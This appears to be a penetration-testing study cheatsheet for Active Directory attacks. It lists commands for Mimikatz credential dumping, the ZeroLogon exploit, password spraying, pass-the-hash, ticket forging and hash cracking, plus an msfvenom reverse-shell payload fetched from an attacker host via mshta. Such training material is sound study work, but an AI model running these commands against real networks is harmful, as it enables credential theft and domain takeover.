---
title: "Active Directory Cheatsheet"
created: "2026-04-12"
type: reference-note
status: active
tags:
  - reference-note
  - active-directory
  - cheatsheet
  - oscp
  - lateral-movement
  - kerberos
  - mimikatz
---

# Active Directory Cheatsheet

Quick reference for AD enumeration, authentication attacks, lateral movement, and hash cracking.

**Related PWK Modules:**
- [[PWK-Module-21-Active-Directory-Enumeration]]
- [[PWK-Module-22-Attacking-AD-Authentication]]
- [[PWK-Module-23-Lateral-Movement-AD]]
- [[PWK-Module-24-Assembling-the-Pieces]]

**Related Permanent Notes:**
- [[Kerberoasting-Attack-Chain]]

---

## AD Enumeration

### net.exe Commands

```cmd
# Current user
net user

# All domain users
net user /domain

# Specific domain user info
net user <username> /domain

# All domain groups
net group /domain

# Members of a specific group
net group "Domain Admins" /domain

# Find Domain Controller hostname
[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
```

### SPN Enumeration (Kerberoasting Prep)

```powershell
# Find accounts with SPNs registered (targets for Kerberoasting)
setspn -L <hostname>

# PowerShell alternative
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
```

### PowerView Enumeration

```powershell
# Import PowerView
Import-Module .\PowerView.ps1

# Who is logged on to a machine right now?
Get-NetLoggedon -ComputerName <hostname>

# Active sessions on a machine
Get-NetSession -ComputerName <dc-hostname>
```

---

## AD Authentication

### Mimikatz — NTLM Hash Dumping

```mimikatz
privilege::debug
token::elevate

# Dump local SAM hashes (local accounts)
lsadump::sam

# Dump all logged-on credentials from LSASS
sekurlsa::logonpasswords
```

### Mimikatz — Kerberos Ticket Dumping

```mimikatz
privilege::debug
token::elevate

# List all Kerberos tickets in memory
sekurlsa::tickets

# Export all tickets to .kirbi files
sekurlsa::tickets /export
```

---

## AD Lateral Movement

### ZeroLogon (CVE-2020-1472)

```bash
# Check if DC is vulnerable
python3 zerologon_tester.py <dc-netbios-name> <dc-ip>

# Exploit to reset DC machine account password to empty
python3 cve-2020-1472-exploit.py <dc-netbios-name> <dc-ip>

# Dump hashes after ZeroLogon
secretsdump.py -just-dc <domain>/<dc-netbios-name>\$@<dc-ip>
```

### Password Spraying

```powershell
# spray-passwords.ps1 — spray a single password against all domain users
.\spray-passwords.ps1 -Pass <password> -Admin
```

```bash
# Hydra RDP spray
hydra -L userlist.txt -p '<password>' rdp://<target-ip>

# Hydra SMB spray
hydra -L userlist.txt -p '<password>' smb://<target-ip>
```

### Plaintext Credentials — Remote Access

```bash
# RDP (xfreerdp)
xfreerdp /u:<username> /p:<password> /v:<target-ip>

# WinRM (evil-winrm)
evil-winrm -i <target-ip> -u <username> -p <password>

# PSExec
impacket-psexec <domain>/<username>:<password>@<target-ip>
```

### Service Account Attacks (Kerberoasting — offline cracking)

```mimikatz
# Export TGS tickets from memory
sekurlsa::tickets /export
```

```bash
# Convert .kirbi to hashcat/john format
kirbi2john.py <ticket.kirbi> > hash.txt

# Crack with john
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt

# Crack with tgsrepcrack.py
python tgsrepcrack.py /usr/share/wordlists/rockyou.txt <ticket.kirbi>
```

### Pass-the-Hash (PtH)

Requires: NTLM hash of a valid user (from `sekurlsa::logonpasswords` or `lsadump::sam`)

```bash
# pth-winexe (SMB)
pth-winexe -U '<domain>/<username>%<lm-hash>:<ntlm-hash>' //<target-ip> cmd

# wmiexec.py (WMI)
impacket-wmiexec <domain>/<username>@<target-ip> -hashes <lm-hash>:<ntlm-hash>

# psexec.py (SMB)
impacket-psexec <domain>/<username>@<target-ip> -hashes <lm-hash>:<ntlm-hash>

# xfreerdp (RDP — requires Restricted Admin mode enabled)
xfreerdp /u:<username> /d:<domain> /pth:<ntlm-hash> /v:<target-ip>

# crackmapexec (SMB spray PtH)
crackmapexec smb <target-ip> -u <username> -H <ntlm-hash> -d <domain>
```

### Overpass-the-Hash (OPtH)

Convert NTLM hash → Kerberos TGT → use Kerberos auth everywhere

```mimikatz
# Spawn process with NTLM hash injected — Kerberos ticket generated on first use
sekurlsa::pth /user:<username> /domain:<domain> /ntlm:<ntlm-hash> /run:powershell
```

```bash
# Impacket: get TGT from hash, save as .ccache
getTGT.py <domain>/<username> -hashes <lm-hash>:<ntlm-hash>
export KRB5CCNAME=<username>.ccache

# Use ticket for psexec
impacket-psexec -k -no-pass <domain>/<username>@<target-hostname>
```

### Pass-the-Ticket (PtT)

Use a stolen/forged Kerberos ticket directly.

```mimikatz
# Import a .kirbi ticket into current session
kerberos::ptt <ticket.kirbi>

# Verify ticket loaded
klist
```

```bash
# Using Rubeus (Windows)
Rubeus.exe ptt /ticket:<base64-ticket>

# Convert ccache (Linux) ↔ kirbi (Windows)
python ticket_converter.py <ticket.kirbi> <ticket.ccache>
python ticket_converter.py <ticket.ccache> <ticket.kirbi>
```

### Silver Tickets

Forge a TGS for a specific service using the service account's NTLM hash.

Requires: service account NTLM hash, domain SID, target SPN

```mimikatz
# Forge silver ticket (Windows)
kerberos::golden /sid:<domain-sid> /domain:<domain> /ptt /target:<target-fqdn> /service:<spn> /rc4:<ntlm-hash> /user:<username>
```

```bash
# Impacket: forge silver ticket (Linux)
ticketer.py -nthash <ntlm-hash> -domain-sid <domain-sid> -domain <domain> -spn <spn> <username>
export KRB5CCNAME=<username>.ccache

# Use ticket
impacket-psexec -k -no-pass <domain>/<username>@<target-hostname>
```

### DCOM Lateral Movement

Requires: local admin on target, valid credentials

```bash
# Generate HTA payload
msfvenom -p windows/shell_reverse_tcp LHOST=<attacker-ip> LPORT=<port> -f hta-psh -o evil.hta

# Host on HTTP server
python3 -m http.server 80
```

```powershell
# On compromised machine — use Excel.Application DCOM object
$com = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("Excel.Application", "<target-ip>"))
$com.DisplayAlerts = $false
$com.DDEInitiate("cmd.exe", "/c mshta http://<attacker-ip>/evil.hta")
```

---

## Hash Cracking Techniques

### NTLM Hashes

```bash
# hashcat (NTLM = mode 1000)
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt

# john
john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
```

### Net-NTLMv2 Hashes (from Responder)

```bash
# hashcat (NTLMv2 = mode 5600)
hashcat -m 5600 hashes.txt /usr/share/wordlists/rockyou.txt
```

### Kerberos TGS Hashes (Kerberoasting)

```bash
# hashcat (TGS-REP = mode 13100)
hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt

# john
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
```

### Kerberos AS-REP Hashes (AS-REP Roasting)

```bash
# hashcat (AS-REP = mode 18200)
hashcat -m 18200 hashes.txt /usr/share/wordlists/rockyou.txt
```

### TGS from .kirbi Files

```bash
# Convert .kirbi → crackable format
kirbi2john.py <ticket.kirbi> > hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt

# Or use tgsrepcrack.py directly
python tgsrepcrack.py /usr/share/wordlists/rockyou.txt <ticket.kirbi>
```

---

## Quick Reference: Attack Chain Selection

| Goal | Tool / Technique |
|------|-----------------|
| Find DA members | `net group "Domain Admins" /domain` |
| Find Kerberoastable accounts | `setspn -L <host>` / PowerView |
| Dump hashes (local admin) | Mimikatz `lsadump::sam` / `sekurlsa::logonpasswords` |
| Lateral move w/ NTLM hash | Pass-the-Hash (wmiexec/psexec/cme) |
| Convert hash → Kerberos TGT | Overpass-the-Hash (mimikatz `sekurlsa::pth`) |
| Use stolen TGS/TGT | Pass-the-Ticket (`kerberos::ptt`) |
| Forge service ticket | Silver Ticket (`kerberos::golden` with `/service`) |
| Crack offline | hashcat (1000=NTLM, 5600=NTLMv2, 13100=TGS, 18200=AS-REP) |
| DC takeover via bug | ZeroLogon (CVE-2020-1472) |

---

*See also: [[Kerberoasting-Attack-Chain]] for detailed Kerberos attack flow*
